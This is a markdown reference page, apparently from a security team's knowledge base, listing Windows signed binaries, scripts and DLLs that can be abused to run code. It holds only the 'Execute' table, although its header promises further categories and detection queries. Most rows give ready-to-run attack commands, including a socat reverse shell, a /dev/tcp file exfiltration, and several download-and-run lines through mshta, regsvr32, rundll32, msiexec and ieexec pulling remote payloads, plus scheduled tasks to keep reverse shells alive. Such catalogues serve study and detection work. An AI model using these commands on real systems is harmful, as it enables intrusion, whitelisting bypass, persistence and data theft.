---
title: lolbins_tactical_categories_and_detections
category: reasoning
engine: team_strategy_arbiter
team_role: lolbins
os_platform: windows
domain_hub: "[[reasoning/LOLBINS]]"
primary_tactic: Defense_Evasion_Firewall
summary: "LOLBINS Complete Tactical Category Index & Detection Matrix (414 commands across 15 categories from https://github.com/CROWInnovations/LOLBAS): Organized by Execute (216), Download (51), AWL Bypass (48), ADS (36), Dump (21), Copy (10), Compile (8), Upload (5), Credentials (5), UAC Bypass (4), Tamper (3), Reconnaissance (3), Decode (2), Encode (1), and Conceal (1) with MITRE ATT&CK mappings and Blue/Hunt Team detection queries."
when_to_apply: "Apply when selecting a LOLBin by tactical objective (Execute, Download, Upload, AWL Bypass, UAC Bypass, Credential/LSASS/NTDS Dump, Alternate Data Streams ADS, Compile, Copy, Encode/Decode) or when writing Blue/Hunt Team WDAC/AppLocker blocks and Event ID 4688/Sysmon EID 1 detection queries."
tags: [reasoning, lolbins, lolbas, execute, download, upload, awl-bypass, uac-bypass, ads, dump, credentials, compile, decode, encode, mitre-attack, sigma, applocker, wdac, sysmon, windows]
updated: 2026-11-01 01:10:00
---
# LOLBINS — Complete Tactical Category Index (`414` Commands Across `15` Categories)

> **Parent Section Hub:** [[reasoning/LOLBINS]]  
> **Official Repository:** [`https://github.com/CROWInnovations/LOLBAS`](https://github.com/CROWInnovations/LOLBAS)  
> **Sibling Playbooks:** [[reasoning/LOLBINS/lolbins_os_binaries_a_to_l]] | [[reasoning/LOLBINS/lolbins_os_binaries_m_to_z]] | [[reasoning/LOLBINS/lolbins_os_scripts_and_libraries]] | [[reasoning/LOLBINS/lolbins_other_ms_binaries]]  
> **Backlinks:** [[00_MEMORY_INDEX]] | [[commands/windows_master_command_playbook]] | [[reasoning/red_team_strategy_playbook]] | [[reasoning/hunt_team_strategy_playbook]] | [[reasoning/blue_team_strategy_playbook]]

---

## Category: `Execute` (216 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`AddinUtil.exe`** (`OSBinaries`) | `T1218` | `User` | `C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.` | Proxy execution of malicious serialized payload |
| **`At.exe`** (`OSBinaries`) | `T1053.002` | `Local Admin` | `C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su C:\Windows\System32\revshell.exe` | Create a recurring task, to eg. to keep reverse shell session(s) alive |
| **`Atbroker.exe`** (`OSBinaries`) | `T1218` | `User` | `ATBroker.exe /start malware` | Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry. |
| **`Bash.exe`** (`OSBinaries`) | `T1202` | `User` | `bash.exe -c calc.exe` | Performs execution of specified file, can be used as a defensive evasion. |
| **`Bash.exe`** (`OSBinaries`) | `T1202` | `User` | `bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"` | Performs execution of specified file, can be used as a defensive evasion. |
| **`Bash.exe`** (`OSBinaries`) | `T1202` | `User` | `bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'` | Performs execution of specified file, can be used as a defensive evasion. |
| **`Bitsadmin.exe`** (`OSBinaries`) | `T1218` | `User` | `bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset` | Execute binary file specified. Can be used as a defensive evasion. |
| **`CertOC.exe`** (`OSBinaries`) | `T1218` | `User` | `certoc.exe -LoadDLL "C:\test\calc.dll"` | Execute code within DLL file |
| **`Cmstp.exe`** (`OSBinaries`) | `T1218.003` | `User` | `cmstp.exe /ni /s c:\cmstp\CorpVPN.inf` | Execute code hidden within an inf file. Download and run scriptlets from internet. |
| **`Conhost.exe`** (`OSBinaries`) | `T1202` | `User` | `conhost.exe calc.exe` | Use conhost.exe as a proxy binary to evade defensive counter-measures |
| **`Conhost.exe`** (`OSBinaries`) | `T1202` | `User` | `conhost.exe --headless calc.exe` | Specify --headless parameter to hide child process window (if applicable) |
| **`CustomShellHost.exe`** (`OSBinaries`) | `T1218` | `User` | `CustomShellHost.exe` | Can be used to evade defensive counter-measures |
| **`Diskshadow.exe`** (`OSBinaries`) | `T1202` | `User` | `diskshadow> exec calc.exe` | Use diskshadow to bypass defensive counter measures |
| **`Dnscmd.exe`** (`OSBinaries`) | `T1543.003` | `DNS admin` | `dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll` | Remotely inject dll to dns server |
| **`Explorer.exe`** (`OSBinaries`) | `T1202` | `User` | `explorer.exe /root,"C:\Windows\System32\calc.exe"` | Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion. |
| **`Explorer.exe`** (`OSBinaries`) | `T1202` | `User` | `explorer.exe C:\Windows\System32\notepad.exe` | Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion. |
| **`Extexport.exe`** (`OSBinaries`) | `T1218` | `User` | `Extexport.exe c:\test foo bar` | Execute dll file |
| **`Forfiles.exe`** (`OSBinaries`) | `T1202` | `User` | `forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe` | Use forfiles to start a new process to evade defensive counter measures |
| **`Fsutil.exe`** (`OSBinaries`) | `T1218` | `User` | `fsutil.exe trace decode` | Spawn a pre-planted executable from fsutil.exe. |
| **`Ftp.exe`** (`OSBinaries`) | `T1202` | `User` | `echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt` | Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand |
| **`Gpscript.exe`** (`OSBinaries`) | `T1218` | `Administrator` | `Gpscript /logon` | Add local group policy logon script to execute file and hide from defensive counter measures |
| **`Gpscript.exe`** (`OSBinaries`) | `T1218` | `Administrator` | `Gpscript /startup` | Add local group policy logon script to execute file and hide from defensive counter measures |
| **`Hh.exe`** (`OSBinaries`) | `T1218.001` | `User` | `HH.exe c:\windows\system32\calc.exe` | Execute process with HH.exe |
| **`Ie4uinit.exe`** (`OSBinaries`) | `T1218` | `User` | `ie4uinit.exe -BaseSettings` | Get code execution by copy files to another location |
| **`iediagcmd.exe`** (`OSBinaries`) | `T1218` | `User` | `set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:c:\test\foo.cab` | Spawn a pre-planted executable from iediagcmd.exe. |
| **`Ieexec.exe`** (`OSBinaries`) | `T1218` | `User` | `ieexec.exe http://x.x.x.x:8080/bypass.exe` | Download and run attacker code from remote location |
| **`Infdefaultinstall.exe`** (`OSBinaries`) | `T1218` | `Admin` | `InfDefaultInstall.exe Infdefaultinstall.inf` | Code execution |
| **`Installutil.exe`** (`OSBinaries`) | `T1218.004` | `User` | `InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll` | Use to execute code and bypass application whitelisting |
| **`Mavinject.exe`** (`OSBinaries`) | `T1218.013` | `User` | `MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll` | Inject dll file into running process |
| **`Microsoft.Workflow.Compiler.exe`** (`OSBinaries`) | `T1127` | `User` | `Microsoft.Workflow.Compiler.exe tests.xml results.xml` | Compile and run code |
| **`Microsoft.Workflow.Compiler.exe`** (`OSBinaries`) | `T1127` | `User` | `Microsoft.Workflow.Compiler.exe tests.txt results.txt` | Compile and run code |
| **`Mmc.exe`** (`OSBinaries`) | `T1218.014` | `User` | `mmc.exe -Embedding c:\path\to\test.msc` | Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry |
| **`Msbuild.exe`** (`OSBinaries`) | `T1127.001` | `User` | `msbuild.exe project.csproj` | Compile and run code |
| **`Msbuild.exe`** (`OSBinaries`) | `T1127.001` | `User` | `msbuild.exe /logger:TargetLogger,C:\Loggers\TargetLogger.dll;MyParameters,Foo` | Execute DLL |
| **`Msbuild.exe`** (`OSBinaries`) | `T1127.001` | `User` | `msbuild.exe project.proj` | Execute project file that contains XslTransformation tag parameters |
| **`Msbuild.exe`** (`OSBinaries`) | `T1036` | `User` | `msbuild.exe @sample.rsp` | Bypass command-line based detections |
| **`Msconfig.exe`** (`OSBinaries`) | `T1218` | `Administrator` | `Msconfig.exe -5` | Code execution using Msconfig.exe |
| **`Msdt.exe`** (`OSBinaries`) | `T1218` | `User` | `msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE` | Execute code |
| **`Msedge.exe`** (`OSBinaries`) | `T1218.015` | `User` | `msedge.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c ping google.com &&"` | Executes a process under a trusted Microsoft signed binary |
| **`Mshta.exe`** (`OSBinaries`) | `T1218.005` | `User` | `mshta.exe evilfile.hta` | Execute code |
| **`Mshta.exe`** (`OSBinaries`) | `T1218.005` | `User` | `mshta.exe vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))` | Execute code |
| **`Mshta.exe`** (`OSBinaries`) | `T1218.005` | `User` | `mshta.exe javascript:a=GetObject("script:https://webserver/payload.sct").Exec();close();` | Execute code |
| **`Msiexec.exe`** (`OSBinaries`) | `T1218.007` | `User` | `msiexec /quiet /i cmd.msi` | Execute custom made msi file with attack code |
| **`Msiexec.exe`** (`OSBinaries`) | `T1218.007` | `User` | `msiexec /q /i http://192.168.100.3/tmp/cmd.png` | Execute custom made msi file with attack code from remote server |
| **`Msiexec.exe`** (`OSBinaries`) | `T1218.007` | `User` | `msiexec /y "C:\folder\evil.dll"` | Execute dll files |
| **`Msiexec.exe`** (`OSBinaries`) | `T1218.007` | `User` | `msiexec /z "C:\folder\evil.dll"` | Execute dll files |
| **`Msiexec.exe`** (`OSBinaries`) | `T1218.007` | `User` | `msiexec /i "https://trustedURL/signed.msi" TRANSFORMS="https://evilurl/evil.mst" /qb` | Install trusted and signed msi file, with additional attack code as Treansorm file, from remote server |
| **`Netsh.exe`** (`OSBinaries`) | `T1546.007` | `Admin` | `netsh.exe add helper C:\Users\User\file.dll` | Proxy execution of .dll |
| **`Odbcconf.exe`** (`OSBinaries`) | `T1218.008` | `User` | `odbcconf /a {REGSVR c:\test\test.dll}` | Execute dll file using technique that can evade defensive counter measures |
| **`Odbcconf.exe`** (`OSBinaries`) | `T1218.008` | `User` | `odbcconf INSTALLDRIVER "lolbas-project\|Driver=c:\test\test.dll\|APILevel=2" odbcconf configsysdsn "lolbas-project" "DSN=lolbas-project"` | Execute dll file using technique that can evade defensive counter measures |
| **`Odbcconf.exe`** (`OSBinaries`) | `T1218.008` | `User` | `odbcconf -f file.rsp` | Execute dll file using technique that can evade defensive counter measures |
| **`OfflineScannerShell.exe`** (`OSBinaries`) | `T1218` | `Administrator` | `OfflineScannerShell` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |
| **`Pcalua.exe`** (`OSBinaries`) | `T1202` | `User` | `pcalua.exe -a calc.exe` | Proxy execution of binary |
| **`Pcalua.exe`** (`OSBinaries`) | `T1202` | `User` | `pcalua.exe -a \\server\payload.dll` | Proxy execution of remote dll file |
| **`Pcalua.exe`** (`OSBinaries`) | `T1202` | `User` | `pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java` | Execution of CPL files |
| **`Pcwrun.exe`** (`OSBinaries`) | `T1218` | `User` | `Pcwrun.exe c:\temp\beacon.exe` | Proxy execution of binary |
| **`Pcwrun.exe`** (`OSBinaries`) | `T1202` | `User` | `Pcwrun.exe /../../$(calc).exe` | Proxy execution of binary |
| **`Pnputil.exe`** (`OSBinaries`) | `T1547` | `Administrator` | `pnputil.exe -i -a C:\Users\hai\Desktop\mo.inf` | Add malicious driver |
| **`Presentationhost.exe`** (`OSBinaries`) | `T1218` | `User` | `Presentationhost.exe C:\temp\Evil.xbap` | Execute code within xbap files |
| **`Provlaunch.exe`** (`OSBinaries`) | `T1218` | `Administrator` | `provlaunch.exe LOLBin` | Executes arbitrary command |
| **`Rasautou.exe`** (`OSBinaries`) | `T1218` | `User, Administrator in Windows 8` | `rasautou -d powershell.dll -p powershell -a a -e e` | Execute DLL code |
| **`Regasm.exe`** (`OSBinaries`) | `T1218.009` | `User` | `regasm.exe /U AllTheThingsx64.dll` | Execute code and bypass Application whitelisting |
| **`Register-cimprovider.exe`** (`OSBinaries`) | `T1218` | `User` | `Register-cimprovider -path "C:\folder\evil.dll"` | Execute code within dll file |
| **`Regsvcs.exe`** (`OSBinaries`) | `T1218.009` | `User` | `regsvcs.exe AllTheThingsx64.dll` | Execute dll file and bypass Application whitelisting |
| **`Regsvr32.exe`** (`OSBinaries`) | `T1218.010` | `User` | `regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll` | Execute code from remote scriptlet, bypass Application whitelisting |
| **`Regsvr32.exe`** (`OSBinaries`) | `T1218.010` | `User` | `regsvr32.exe /s /u /i:file.sct scrobj.dll` | Execute code from scriptlet, bypass Application whitelisting |
| **`Rundll32.exe`** (`OSBinaries`) | `T1218.011` | `User` | `rundll32.exe AllTheThingsx64,EntryPoint` | Execute dll file |
| **`Rundll32.exe`** (`OSBinaries`) | `T1218.011` | `User` | `rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint` | Execute DLL from SMB share. |
| **`Rundll32.exe`** (`OSBinaries`) | `T1218.011` | `User` | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")` | Execute code from Internet |
| **`Rundll32.exe`** (`OSBinaries`) | `T1218.011` | `User` | `rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");` | Proxy execution |
| **`Rundll32.exe`** (`OSBinaries`) | `T1218.011` | `User` | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}` | Proxy execution |
| **`Rundll32.exe`** (`OSBinaries`) | `T1218.011` | `User` | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")` | Execute code from Internet |
| **`Rundll32.exe`** (`OSBinaries`) | `T1218.011` | `User` | `rundll32.exe -sta {CLSID}` | Execute a DLL/EXE COM server payload or ScriptletURL code. |
| **`Runexehelper.exe`** (`OSBinaries`) | `T1218` | `User` | `runexehelper.exe c:\windows\system32\calc.exe` | Executes arbitrary code |
| **`Runonce.exe`** (`OSBinaries`) | `T1218` | `Administrator` | `Runonce.exe /AlternateShellStartup` | Persistence, bypassing defensive counter measures |
| **`Runscripthelper.exe`** (`OSBinaries`) | `T1218` | `User` | `runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test` | Bypass constrained language mode and execute Powershell script |
| **`Schtasks.exe`** (`OSBinaries`) | `T1053.005` | `User` | `schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe` | Create a recurring task to keep reverse shell session(s) alive |
| **`Schtasks.exe`** (`OSBinaries`) | `T1053.005` | `Administrator` | `schtasks /create /s targetmachine /tn "MyTask" /tr c:\some\directory\notevil.exe /sc daily` | Create a remote task to run daily relative to the the time of creation |
| **`Scriptrunner.exe`** (`OSBinaries`) | `T1202` | `User` | `Scriptrunner.exe -appvscript calc.exe` | Execute binary through proxy binary to evade defensive counter measures |
| **`Scriptrunner.exe`** (`OSBinaries`) | `T1218` | `User` | `ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"` | Execute binary through proxy binary from external server to evade defensive counter measures |
| **`Setres.exe`** (`OSBinaries`) | `T1218` | `User` | `setres.exe -w 800 -h 600` | Executes arbitrary code |
| **`SettingSyncHost.exe`** (`OSBinaries`) | `T1218` | `User` | `SettingSyncHost -LoadAndRunDiagScript anything` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |
| **`SettingSyncHost.exe`** (`OSBinaries`) | `T1218` | `User` | `SettingSyncHost -LoadAndRunDiagScriptNoCab anything` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file. |
| **`ssh.exe`** (`OSBinaries`) | `T1202` | `User` | `ssh localhost calc.exe` | Execute specified command, can be used for defense evasion. |
| **`ssh.exe`** (`OSBinaries`) | `T1202` | `User` | `ssh -o ProxyCommand=calc.exe .` | Performs execution of specified file, can be used as a defensive evasion. |
| **`Stordiag.exe`** (`OSBinaries`) | `T1218` | `User` | `stordiag.exe` | Possible defence evasion purposes. |
| **`SyncAppvPublishingServer.exe`** (`OSBinaries`) | `T1218` | `User` | `SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"` | Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures |
| **`Ttdinject.exe`** (`OSBinaries`) | `T1127` | `Administrator` | `TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "C:/Windows/System32/calc.exe"` | Spawn process using other binary |
| **`Ttdinject.exe`** (`OSBinaries`) | `T1127` | `Administrator` | `ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /launch "C:/Windows/System32/calc.exe"` | Spawn process using other binary |
| **`Tttracer.exe`** (`OSBinaries`) | `T1127` | `Administrator` | `tttracer.exe C:\windows\system32\calc.exe` | Spawn process using other binary |
| **`Unregmp2.exe`** (`OSBinaries`) | `T1202` | `User` | `rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"` | Proxy execution of binary |
| **`Verclsid.exe`** (`OSBinaries`) | `T1218.012` | `User` | `verclsid.exe /S /C {CLSID}` | Run a com object created in registry to evade defensive counter measures |
| **`Wab.exe`** (`OSBinaries`) | `T1218` | `Administrator` | `wab.exe` | Execute dll file. Bypass defensive counter measures |
| **`winget.exe`** (`OSBinaries`) | `T1105` | `Local Aministrator - required to enabled local manifest setting` | `winget.exe install --manifest manifest.yml` | Download and execute an arbitrary file from the internet |
| **`Wlrmdr.exe`** (`OSBinaries`) | `T1202` | `User` | `wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u calc.exe` | Use wlrmdr as a proxy binary to evade defensive countermeasures |
| **`Wmic.exe`** (`OSBinaries`) | `T1218` | `User` | `wmic.exe process call create calc` | Execute binary from wmic to evade defensive counter measures |
| **`Wmic.exe`** (`OSBinaries`) | `T1218` | `User` | `wmic.exe /node:"192.168.0.1" process call create "evil.exe"` | Execute binary on a remote system |
| **`Wmic.exe`** (`OSBinaries`) | `T1218` | `User` | `wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"` | Execute binary on remote system |
| **`Wmic.exe`** (`OSBinaries`) | `T1218` | `User` | `wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"` | Execute script from remote system |
| **`WorkFolders.exe`** (`OSBinaries`) | `T1218` | `User` | `WorkFolders` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |
| **`wuauclt.exe`** (`OSBinaries`) | `T1218` | `User` | `wuauclt.exe /UpdateDeploymentProvider Full_Path_To_DLL /RunHandlerComServer` | Execute dll via attach/detach methods |
| **`Xwizard.exe`** (`OSBinaries`) | `T1218` | `User` | `xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}` | Run a com object created in registry to evade defensive counter measures |
| **`Xwizard.exe`** (`OSBinaries`) | `T1218` | `User` | `xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}` | Run a com object created in registry to evade defensive counter measures |
| **`msedge_proxy.exe`** (`OSBinaries`) | `T1218.015` | `User` | `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="C:\\Windows\\System32\\cmd.exe /c ping google.com &&"` | Executes a process under a trusted Microsoft signed binary |
| **`msedgewebview2.exe`** (`OSBinaries`) | `T1218.015` | `Low privileges` | `msedgewebview2.exe --no-sandbox --browser-subprocess-path="C:\Windows\System32\calc.exe"` | Proxy execution of binary |
| **`msedgewebview2.exe`** (`OSBinaries`) | `T1218.015` | `User` | `msedgewebview2.exe --utility-cmd-prefix="calc.exe"` | Proxy execution of binary |
| **`msedgewebview2.exe`** (`OSBinaries`) | `T1218.015` | `User` | `msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher="calc.exe"` | Proxy execution of binary |
| **`msedgewebview2.exe`** (`OSBinaries`) | `T1218.015` | `User` | `msedgewebview2.exe --no-sandbox --renderer-cmd-prefix="calc.exe"` | Proxy execution of binary |
| **`wt.exe`** (`OSBinaries`) | `T1202` | `User` | `wt.exe calc.exe` | Use wt.exe as a proxy binary to evade defensive counter-measures |
| **`CL_LoadAssembly.ps1`** (`OSScripts`) | `T1216` | `User` | `powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"` | Execute proxied payload with Microsoft signed binary |
| **`CL_Mutexverifiers.ps1`** (`OSScripts`) | `T1216` | `User` | `. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess calc.ps1` | Proxy execution |
| **`CL_Invocation.ps1`** (`OSScripts`) | `T1216` | `User` | `. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke <executable> [args]` | Proxy execution |
| **`Launch-VsDevShell.ps1`** (`OSScripts`) | `T1216` | `User` | `powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath "C:\windows\system32\calc.exe"` | Proxy execution |
| **`Launch-VsDevShell.ps1`** (`OSScripts`) | `T1216` | `User` | `powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath "/../../../../../; calc.exe ;"` | Proxy execution |
| **`Manage-bde.wsf`** (`OSScripts`) | `T1216` | `User` | `set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf` | Proxy execution from script |
| **`Manage-bde.wsf`** (`OSScripts`) | `T1216` | `User` | `copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf` | Proxy execution from script |
| **`Pubprn.vbs`** (`OSScripts`) | `T1216.001` | `User` | `pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct` | Proxy execution |
| **`Syncappvpublishingserver.vbs`** (`OSScripts`) | `T1216.002` | `User` | `SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"` | Use Powershell host invoked from vbs script |
| **`UtilityFunctions.ps1`** (`OSScripts`) | `T1216` | `User` | `powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"` | Execute proxied payload with Microsoft signed binary |
| **`winrm.vbs`** (`OSScripts`) | `T1216` | `User` | `winrm invoke Create wmicimv2/Win32_Process @{CommandLine="notepad.exe"} -r:http://target:5985` | Proxy execution |
| **`winrm.vbs`** (`OSScripts`) | `T1216` | `Admin` | `winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd.exe /k c:\windows\system32\notepad.exe"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985` | Proxy execution |
| **`Pester.bat`** (`OSScripts`) | `T1216` | `User` | `Pester.bat [/help\|?\|-?\|/?] "$null; notepad"` | Proxy execution |
| **`Pester.bat`** (`OSScripts`) | `T1216` | `User` | `Pester.bat ;calc.exe` | Proxy execution |
| **`Pester.bat`** (`OSScripts`) | `T1216` | `User` | `Pester.bat ;calc.exe` | Proxy execution |
| **`Advpack.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe advpack.dll,RegisterOCX test.dll` | Load a DLL payload. |
| **`Advpack.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe advpack.dll,RegisterOCX calc.exe` | Run an executable payload. |
| **`Advpack.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32 advpack.dll, RegisterOCX "cmd.exe /c calc.exe"` | Run an executable payload. |
| **`Desk.cpl`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe desk.cpl,InstallScreenSaver C:\temp\file.scr` | Launch any executable payload, as long as it uses the .scr extension. |
| **`Desk.cpl`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe desk.cpl,InstallScreenSaver \\127.0.0.1\c$\temp\file.scr` | Launch any executable payload, as long as it uses the .scr extension. |
| **`Ieadvpack.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe ieadvpack.dll,RegisterOCX test.dll` | Load a DLL payload. |
| **`Ieadvpack.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe ieadvpack.dll,RegisterOCX calc.exe` | Run an executable payload. |
| **`Ieadvpack.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32 ieadvpack.dll, RegisterOCX "cmd.exe /c calc.exe"` | Run an executable payload. |
| **`Ieframe.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe ieframe.dll,OpenURL "C:\test\calc.url"` | Load an executable payload by calling a .url file with or without quotes.  The .url file extension can be renamed. |
| **`Mshtml.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe Mshtml.dll,PrintHTML "C:\temp\calc.hta"` | Launch an HTA application. |
| **`Pcwutl.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe pcwutl.dll,LaunchApplication calc.exe` | Launch an executable. |
| **`Setupapi.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Tools\calc_exe.inf` | Load an executable payload. |
| **`Shdocvw.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe shdocvw.dll,OpenURL "C:\test\calc.url"` | Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed. |
| **`Shell32.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe shell32.dll,Control_RunDLL c:\path\to\payload.dll` | Load a DLL payload. |
| **`Shell32.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe shell32.dll,ShellExec_RunDLL beacon.exe` | Run an executable payload. |
| **`Shell32.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c echo hi"` | Run an executable payload. |
| **`Syssetup.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\temp\something.inf` | Load an executable payload. |
| **`Url.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe url.dll,OpenURL "C:\test\calc.hta"` | Invoke an HTML Application via mshta.exe (Default Handler). |
| **`Url.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe url.dll,OpenURL "C:\test\calc.url"` | Load an executable payload by calling a .url file with or without quotes. |
| **`Url.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e` | Load an executable payload by specifying the file protocol handler (obfuscated). |
| **`Url.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe url.dll,FileProtocolHandler calc.exe` | Launch an executable. |
| **`Url.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e` | Load an executable payload by specifying the file protocol handler (obfuscated). |
| **`Url.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta` | Invoke an HTML Application via mshta.exe (Default Handler). |
| **`Zipfldr.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe zipfldr.dll,RouteTheCall calc.exe` | Launch an executable. |
| **`Zipfldr.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e` | Launch an executable. |
| **`AccCheckConsole.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `AccCheckConsole.exe -window "Untitled - Notepad" C:\path\to\your\lolbas.dll` | Local execution of managed code from assembly DLL. |
| **`adplus.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `adplus.exe -c config-adplus.xml` | Run commands under a trusted Microsoft signed binary |
| **`adplus.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `adplus.exe -crash -o "C:\temp\" -sc calc.exe` | Run commands under a trusted Microsoft signed binary |
